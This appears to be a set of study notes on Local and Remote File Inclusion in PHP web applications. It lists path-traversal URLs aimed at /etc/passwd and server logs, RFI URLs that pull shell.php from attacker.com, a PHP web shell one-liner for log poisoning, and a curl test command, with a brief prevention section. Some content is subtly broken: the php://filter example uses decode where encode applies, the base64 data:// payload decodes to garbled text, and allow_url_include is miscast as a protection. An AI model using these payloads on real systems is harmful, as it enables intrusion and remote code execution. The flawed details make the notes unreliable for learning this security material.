# 🌐 File Inclusion Module - 9 Specialized Guides

---

## 📚 Basic LFI (Local File Inclusion)

> [!ABSTRACT] Overview of Basic LFI
> This section covers foundational concepts and techniques for Local File Inclusion, including how to identify and exploit basic vulnerabilities in web applications.

### Identifying Vulnerabilities

Identify potential LFI points through URL parameters such as `?page=`, `file=`, or similar. Look for directory traversal sequences like `../` that can be used to include arbitrary files on the server.

> [!INFO] Example Parameter
> 
> ```
> http://example.com/index.php?page=../../../../etc/passwd
> ```

### Exploiting Basic LFI

Once a vulnerable parameter is identified, attempt to access critical system files like `/etc/passwd` or `phpinfo()` via URL manipulation.

> [!SUCCESS] Successful LFI Example
> 
> ```
> http://example.com/index.php?page=../../../../../../var/log/apache2/access.log
> ```

---

## 🎓 Advanced Bypasses

Advanced bypass techniques are necessary when basic LFI protections like `allow_url_include` or filters are in place.

### Using PHP Wrappers

PHP wrappers can be used to bypass file inclusion restrictions by leveraging protocols such as `file://`, `http://`, and `php://`.

> [!EXAMPLE] PHP Wrapper Example
>
> ```
> http://example.com/index.php?page=php://filter/convert.base64-decode/resource=/etc/passwd
> ```

### RFI (Remote File Inclusion)

RFI involves including remote files via URL parameters, often used when the application uses include statements with external input.

> [!SUCCESS] Successful RFI Example
>
> ```
> http://example.com/index.php?page=http://attacker.com/shell.php
> ```

---

## 🖥️ PHP Wrappers

PHP wrappers provide powerful methods to manipulate and access files in various ways. Commonly used are `php://filter`, `file://`, and `data://`.

### Data URI Scheme

Data URIs can be used for small payloads or inline data inclusion, often bypassing file system restrictions.

> [!EXAMPLE] Data URI Example
>
> ```
> http://example.com/index.php?page=data://text/plain;base64,aW5zZXQoJ3Zhci9sb2NhbC9leHBpcmVzL3BuZycsImh0dHA6Ly9hdHRhYmVyLmNvbS9zaGlsZC5waHAnKTs=
> ```

---

## 🚀 RFI (Remote File Inclusion)

RFI occurs when a web application includes remote files through user-controllable parameters.

### Including Remote Files

Using URL parameters to include remote scripts is a common exploit technique for LFI vulnerabilities.

> [!SUCCESS] Example of Including Remote Script
>
> ```
> http://example.com/index.php?page=http://attacker.com/evilscript.php
> ```

---

## 📂 File Uploads

File upload mechanisms are often exploited through uploaded malicious files like PHP shells or scripts.

### Uploading Malicious Files

Upload a file via the web application's file upload feature. The goal is to place an executable file in a directory accessible by LFI.

> [!WARNING] Example of Uploading Shell
>
> ```
> http://example.com/upload.php?file=shell.php
> ```

---

## 📝 Log Poisoning

Log poisoning involves manipulating logs to include malicious code or commands, often leading to RCE (Remote Code Execution).

### Poisoning Logs with PHP

Inject PHP code into server logs that can be executed through LFI.

> [!EXAMPLE] Example of Injected PHP
>
> ```
> <?php echo shell_exec($_GET['cmd']); ?>
> ```

---

## 🤖 Automated Tools for LFI Exploitation

Automated tools such as `dirb`, `nikto`, and custom scripts can aid in identifying and exploiting LFI vulnerabilities.

### Using Dirb for Scanning

Scan directories using `dirb` to identify potential files or paths that may be exploitable via LFI.

> [!SUCCESS] Example of Using Dirb
>
> ```
> dirb http://example.com /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -r
> ```

---

## 🛡️ Prevention and Mitigation

Preventing LFI involves securing file system permissions, filtering input parameters, using non-executable file types for includes, and employing WAFs (Web Application Firewalls).

### Secure File Inclusion

Use secure coding practices to prevent malicious file inclusion. For example, validate user inputs against a whitelist of allowed files.

> [!WARNING] Example of Unsafe PHP Include
>
> ```
> include($_GET['file']);
> ```

---

## 🎯 Skills Assessment

Assess your understanding and proficiency in identifying and exploiting LFI vulnerabilities through practical exercises and labs.

### Lab Exercises

Complete lab exercises that involve finding, exploiting, and mitigating LFI vulnerabilities. Practice using tools like `curl`, `wget`, and custom scripts to test for LFI conditions.

> [!SUCCESS] Example of Practicing with Curl
>
> ```
> curl -X GET "http://example.com/index.php?page=../../../../../../etc/passwd"
> ```

---

# 🧠 Exam Mental Model

```text
LFI Identification → Vulnerability Assessment → Exploitation Techniques → Mitigation Strategies → Practical Testing
```

> [!SUCCESS] LFI Rule of Thumb
>
> **When dealing with LFI:**
> ```text
> Identify Vectors → Test Traversal → Bypass Filters → Upload Payloads → Execute Code
> ```

Most web application compromises involving file inclusion vulnerabilities require a thorough understanding of traversal techniques, advanced bypass methods, and secure coding practices.